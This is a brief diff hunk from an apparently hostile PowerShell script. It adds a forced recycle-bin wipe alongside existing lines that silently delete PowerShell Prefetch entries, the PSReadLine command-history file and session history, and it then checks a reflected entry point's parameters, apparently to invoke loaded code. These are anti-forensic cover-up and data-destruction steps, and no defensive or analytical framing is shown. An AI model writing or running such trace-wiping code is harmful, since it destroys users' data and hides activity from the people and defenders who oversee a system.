@@ -71,6 +71,7 @@ foreach ($svc in $services) {
     Start-Service -Name $svc -ErrorAction SilentlyContinue
 }
 Remove-Item -Path "C:\Windows\Prefetch\POWERSHELL*" -Force -ErrorAction SilentlyContinue
+Clear-RecycleBin -Force
 Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 Clear-History -ErrorAction SilentlyContinue
 if ($entry -and $entry.GetParameters().Count -eq 1) {
